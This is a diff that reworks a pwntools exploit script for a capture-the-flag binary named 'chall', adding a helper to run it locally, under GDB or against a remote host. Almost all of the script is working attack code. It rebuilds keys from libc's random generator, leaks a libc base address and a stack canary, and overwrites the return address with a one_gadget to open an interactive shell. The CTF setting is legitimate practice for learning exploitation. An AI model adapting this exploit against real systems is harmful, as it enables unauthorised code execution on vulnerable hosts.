@@ -1,19 +1,31 @@
 #!/usr/bin/env python3
 from pwn import *
-
 import ctypes
 
-bin_file = './chall'
-context(os = 'linux', arch = 'amd64')
-# HOST = ''
-# PORT = 
-binf = ELF(bin_file)
-libc = ELF('./libc.so.6')
+BIN_FILE  = './chall'
+LIBC_FILE = './libc.so.6'
+
+HOST = args.HOST or 'localhost'
+PORT = int(args.PORT or 1337)
+
+context(os='linux', arch='amd64')
+# context.terminal = ['tmux', 'splitw', '-h']
+# context.log_level = 'debug'
+
+binf = ELF(BIN_FILE)
+libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None
 
 chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
 keys = {} 
 
-### バイナリの動きを再現して、keyの辞書を作る ###
+def start():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    elif args.GDB:
+        return gdb.debug(BIN_FILE)
+    else:
+        return process(BIN_FILE)
+
 def prepare():
     loaded_lib = ctypes.cdll.LoadLibrary('./libc.so.6')
     for i in range(0x10000):
@@ -37,20 +49,17 @@ def attack(io, **kwargs):
     canary_off = 49
     onegads = [0x4f3d5, 0x4f432, 0x10a41c]
 
-    ### libcのベースアドレスを計算 ###
     leaked_addr = 0 # __libc_start_main + 231
     for i in range(4):
         leaked_addr += leak(io, base_off + i) << (16 * i)
     libc.address = leaked_addr  - 231 - libc.sym.__libc_start_main
     info('libc_base : 0x{:08x}'.format(libc.address))
 
-    ### canaryをleak ###
     canary = 0
     for i in range(4):
         canary += leak(io, canary_off + i) << (16 * i)
     info('canary : 0x{:08x}'.format(canary))
 
-    ### 仕上げ ###
     addr_onegad = libc.address + onegads[0]
     payload = b'a' * 88
     payload += p64(canary)
@@ -60,11 +69,9 @@ def attack(io, **kwargs):
     io.sendlineafter('>', 'quit')
     
 def main():
-    io = process(bin_file)
-    #io = remote(HOST, PORT)
+    io = start()
     prepare()
     attack(io)
-    #gdb.attach(io, '')
     io.interactive()
 
 if __name__ == '__main__':
